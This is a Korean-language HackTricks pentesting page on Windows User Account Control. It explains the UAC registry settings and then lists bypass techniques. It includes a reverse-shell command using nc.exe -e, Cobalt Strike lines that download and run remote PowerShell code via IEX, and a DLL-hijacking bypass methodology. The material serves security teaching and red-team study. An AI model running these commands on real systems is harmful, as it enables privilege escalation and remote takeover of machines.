# UAC - 사용자 계정 컨트롤

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter**에서 **팔로우**하세요** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.**

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)를 사용하여 세계에서 **가장 진보된** 커뮤니티 도구로 **워크플로우를 쉽게 구축하고 자동화**하세요.\
오늘 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[사용자 계정 컨트롤 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)는 **승격된 활동에 대한 동의 프롬프트**를 활성화하는 기능입니다. 애플리케이션은 서로 다른 `무결성` 수준을 가지며, **높은 수준**의 프로그램은 **시스템을 손상시킬 수 있는 작업**을 수행할 수 있습니다. UAC가 활성화되면 애플리케이션과 작업은 항상 **비관리자 계정의 보안 컨텍스트에서 실행**되며, 관리자가 명시적으로 이러한 애플리케이션/작업이 시스템에 대한 관리자 수준의 액세스를 갖도록 승인하지 않는 한 그렇습니다. 이는 관리자가 의도하지 않은 변경으로부터 보호하는 편의 기능이지만 보안 경계로 간주되지는 않습니다.

무결성 수준에 대한 자세한 정보는 다음을 참조하세요:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

UAC가 설정되면 관리자는 2개의 토큰을 받습니다: 일반 사용자 키, 일반 수준에서 정기적인 작업을 수행하기 위한 것과 관리자 권한이 있는 하나입니다.

이 [페이지](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)에서는 UAC가 어떻게 작동하는지에 대해 깊이 있게 논의하며, 로그인 프로세스, 사용자 경험 및 UAC 아키텍처를 포함합니다. 관리자는 보안 정책을 사용하여 조직의 특정 요구에 맞게 UAC 작동 방식을 구성할 수 있으며, 로컬 수준에서 (secpol.msc 사용) 또는 Active Directory 도메인 환경에서 그룹 정책 개체(GPO)를 통해 구성하고 배포할 수 있습니다. 다양한 설정에 대한 자세한 내용은 [여기](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)에서 논의됩니다. UAC에 대해 설정할 수 있는 그룹 정책 설정은 10개가 있습니다. 다음 표는 추가 세부 정보를 제공합니다:

| 그룹 정책 설정                                                                                                                                                                                                                                                                                                                                                           | 레지스트리 키                | 기본 설정                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [사용자 계정 컨트롤: 내장 관리자 계정에 대한 관리자 승인 모드](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | 비활성화                                                     |
| [사용자 계정 컨트롤: UIAccess 애플리케이션이 보안 데스크탑을 사용하지 않고 승격을 요청할 수 있도록 허용](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | 비활성화                                                     |
| [사용자 계정 컨트롤: 관리자에 대한 승격 프롬프트의 동작](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | 비윈도우 바이너리에 대한 동의 요청                      |
| [사용자 계정 컨트롤: 일반 사용자에 대한 승격 프롬프트의 동작](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | 보안 데스크탑에서 자격 증명 요청                       |
| [사용자 계정 컨트롤: 애플리케이션 설치 감지 및 승격 요청](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | 활성화 (홈 기본값) 비활성화 (기업 기본값) |
| [사용자 계정 컨트롤: 서명되고 검증된 실행 파일만 승격](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | 비활성화                                                     |
| [사용자 계정 컨트롤: 보안 위치에 설치된 UIAccess 애플리케이션만 승격](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | 활성화                                                      |
| [사용자 계정 컨트롤: 모든 관리자를 관리자 승인 모드에서 실행](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | 활성화                                                      |
| [사용자 계정 컨트롤: 승격 요청 시 보안 데스크탑으로 전환](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | 활성화                                                      |
| [사용자 계정 컨트롤: 파일 및 레지스트리 쓰기 실패를 사용자별 위치로 가상화](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | 활성화                                                      |

### UAC 우회 이론

일부 프로그램은 **사용자가** **관리자 그룹에 속하는 경우** **자동으로 승격**됩니다. 이러한 바이너리는 _**Manifests**_ 내부에 _**autoElevate**_ 옵션을 _**True**_ 값으로 가지고 있습니다. 바이너리는 또한 **Microsoft에 의해 서명**되어야 합니다.

그런 다음, **UAC**를 **우회**하기 위해 (무결성 수준 **중간**에서 **높음**으로 승격) 일부 공격자는 이러한 종류의 바이너리를 사용하여 **임의 코드를 실행**합니다. 이는 **높은 수준의 무결성 프로세스**에서 실행되기 때문입니다.

바이너리의 _**Manifest**_를 확인하려면 Sysinternals의 _**sigcheck.exe**_ 도구를 사용할 수 있습니다. 그리고 _Process Explorer_ 또는 _Process Monitor_ (Sysinternals)의 프로세스의 **무결성 수준**을 **확인**할 수 있습니다.

### UAC 확인

UAC가 활성화되어 있는지 확인하려면 다음을 수행하세요:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
만약 **`1`**이면 UAC가 **활성화**된 것이고, **`0`**이거나 **존재하지 않으면** UAC가 **비활성화**된 것입니다.

그런 다음, **어떤 수준**이 구성되어 있는지 확인하십시오:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* **`0`**이면, UAC가 프롬프트하지 않습니다 (마치 **비활성화**된 것처럼)
* **`1`**이면, 관리자가 **사용자 이름과 비밀번호**를 요청받아야 하며, 높은 권한으로 바이너리를 실행할 수 있습니다 (보안 데스크탑에서)
* **`2`** (**항상 나에게 알림**) UAC는 관리자가 높은 권한으로 무언가를 실행하려고 할 때 항상 확인을 요청합니다 (보안 데스크탑에서)
* **`3`**은 `1`과 같지만 보안 데스크탑에서 필요하지 않습니다
* **`4`**는 `2`와 같지만 보안 데스크탑에서 필요하지 않습니다
* **`5`**(**기본값**)는 관리자가 높은 권한으로 비 Windows 바이너리를 실행하기 위해 확인을 요청합니다

그런 다음 **`LocalAccountTokenFilterPolicy`**의 값을 확인해야 합니다\
값이 **`0`**이면, **RID 500** 사용자 (**내장 관리자**)만 **UAC 없이 관리 작업을 수행할 수** 있으며, `1`이면 **"Administrators"** 그룹 내의 모든 계정이 이를 수행할 수 있습니다.

마지막으로 **`FilterAdministratorToken`** 키의 값을 확인해야 합니다\
**`0`**(기본값)이면, **내장 관리자 계정이** 원격 관리 작업을 수행할 수 있으며, **`1`**이면 내장 관리자 계정은 `LocalAccountTokenFilterPolicy`가 `1`로 설정되지 않는 한 원격 관리 작업을 수행할 수 없습니다.

#### 요약

* `EnableLUA=0` 또는 **존재하지 않으면**, **누구에게도 UAC 없음**
* `EnableLua=1`이고 **`LocalAccountTokenFilterPolicy=1`**이면, 누구에게도 UAC 없음
* `EnableLua=1`이고 **`LocalAccountTokenFilterPolicy=0`** 및 **`FilterAdministratorToken=0`**이면, RID 500 (내장 관리자)에게는 UAC 없음
* `EnableLua=1`이고 **`LocalAccountTokenFilterPolicy=0`** 및 **`FilterAdministratorToken=1`**이면, 모두에게 UAC 있음

이 모든 정보는 **metasploit** 모듈: `post/windows/gather/win_privs`를 사용하여 수집할 수 있습니다.

사용자의 그룹을 확인하고 무결성 수준을 얻을 수도 있습니다:
```
net user %username%
whoami /groups | findstr Level
```
## UAC 우회

{% hint style="info" %}
피해자에게 그래픽 접근이 가능하다면, UAC 프롬프트가 나타날 때 "예"를 클릭하면 UAC 우회가 간단합니다.
{% endhint %}

UAC 우회는 다음 상황에서 필요합니다: **UAC가 활성화되어 있고, 프로세스가 중간 무결성 컨텍스트에서 실행되며, 사용자가 관리자 그룹에 속하는 경우**.

UAC가 **최고 보안 수준(항상)에 있을 때 UAC를 우회하는 것이 다른 수준(기본)에 비해 훨씬 더 어렵다는 점을 언급하는 것이 중요합니다.**

### UAC 비활성화

UAC가 이미 비활성화된 경우(`ConsentPromptBehaviorAdmin`이 **`0`**) **관리자 권한으로 역방향 셸을 실행할 수 있습니다** (높은 무결성 수준) 다음과 같은 방법을 사용하여:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC 우회와 토큰 복제

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **매우** 기본적인 UAC "우회" (전체 파일 시스템 접근)

관리자 그룹에 속한 사용자로 쉘을 가지고 있다면 **C$** 공유를 SMB(파일 시스템)를 통해 새로운 디스크에 로컬로 마운트할 수 있으며, **파일 시스템 내의 모든 것에 접근할 수 있습니다** (관리자 홈 폴더 포함).

{% hint style="warning" %}
**이 트릭은 더 이상 작동하지 않는 것 같습니다**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC 우회 공격 with cobalt strike

Cobalt Strike 기술은 UAC가 최대 보안 수준으로 설정되어 있지 않을 때만 작동합니다.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire**와 **Metasploit**는 **UAC**를 **우회**하는 여러 모듈을 가지고 있습니다.

### KRBUACBypass

문서 및 도구는 [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)에서 확인할 수 있습니다.

### UAC 우회 익스플로잇

[**UACME**](https://github.com/hfiref0x/UACME)는 여러 UAC 우회 익스플로잇의 **컴파일**입니다. **visual studio 또는 msbuild를 사용하여 UACME를 컴파일해야** 한다는 점에 유의하세요. 컴파일은 여러 실행 파일(예: `Source\Akagi\outout\x64\Debug\Akagi.exe`)을 생성하며, **어떤 것이 필요한지 알아야** 합니다.\
일부 우회 방법은 **다른 프로그램을 알림**하여 **사용자**에게 무언가가 발생하고 있음을 **알릴 수** 있으므로 **주의해야** 합니다.

UACME는 각 기술이 작동하기 시작한 **빌드 버전**을 가지고 있습니다. 귀하의 버전에 영향을 미치는 기술을 검색할 수 있습니다:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) page you get the Windows release `1607` from the build versions.

#### More UAC bypass

**모든** 기술은 AUC를 우회하기 위해 **전체 대화형 셸**이 **필요**합니다 (일반 nc.exe 셸은 충분하지 않습니다).

**meterpreter** 세션을 사용하여 얻을 수 있습니다. **Session** 값이 **1**인 **프로세스**로 마이그레이션하세요:

![](<../../.gitbook/assets/image (863).png>)

(_explorer.exe_는 작동해야 합니다)

### UAC Bypass with GUI

**GUI에 접근할 수 있다면 UAC 프롬프트가 나타날 때 그냥 수락하면 됩니다**, 우회할 필요가 없습니다. 따라서 GUI에 접근하면 UAC를 우회할 수 있습니다.

게다가, 누군가가 사용 중인 GUI 세션을 얻으면 (잠재적으로 RDP를 통해) **관리자로 실행되는 몇 가지 도구가 있을 수 있습니다**. 여기서 **cmd**를 예를 들어 **관리자 권한으로** 직접 실행할 수 있습니다. UAC에 의해 다시 프롬프트되지 않습니다. [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)와 같은 도구입니다. 이는 좀 더 **은밀할 수 있습니다**.

### Noisy brute-force UAC bypass

시끄러운 것이 신경 쓰이지 않는다면, **다음과 같은 것을 실행할 수 있습니다**: [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) 이 **사용자가 수락할 때까지 권한 상승을 요청합니다**.

### Your own bypass - Basic UAC bypass methodology

**UACME**를 살펴보면 **대부분의 UAC 우회는 Dll Hijacking 취약점을 악용합니다** (주로 _C:\Windows\System32_에 악성 dll을 작성하는 것입니다). [Dll Hijacking 취약점을 찾는 방법을 배우려면 여기를 읽으세요](../windows-local-privilege-escalation/dll-hijacking/).

1. **자동 상승**하는 이진 파일을 찾습니다 (실행 시 높은 무결성 수준에서 실행되는지 확인).
2. procmon을 사용하여 **DLL Hijacking**에 취약할 수 있는 "**NAME NOT FOUND**" 이벤트를 찾습니다.
3. 아마도 **쓰기 권한이 없는** 일부 **보호된 경로**(예: C:\Windows\System32) 내에 DLL을 **작성**해야 할 것입니다. 이를 우회할 수 있는 방법은:
   1. **wusa.exe**: Windows 7, 8 및 8.1. CAB 파일의 내용을 보호된 경로 내에 추출할 수 있습니다 (이 도구는 높은 무결성 수준에서 실행되기 때문입니다).
   2. **IFileOperation**: Windows 10.
4. 보호된 경로 내에 DLL을 복사하고 취약하고 자동 상승된 이진 파일을 실행하는 **스크립트**를 준비합니다.

### Another UAC bypass technique

**자동 상승 이진 파일**이 **레지스트리**에서 **이진 파일** 또는 **명령**의 **이름/경로**를 **읽으려는지** 감시하는 것입니다 (이진 파일이 **HKCU** 내에서 이 정보를 검색하는 경우 더 흥미롭습니다).

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
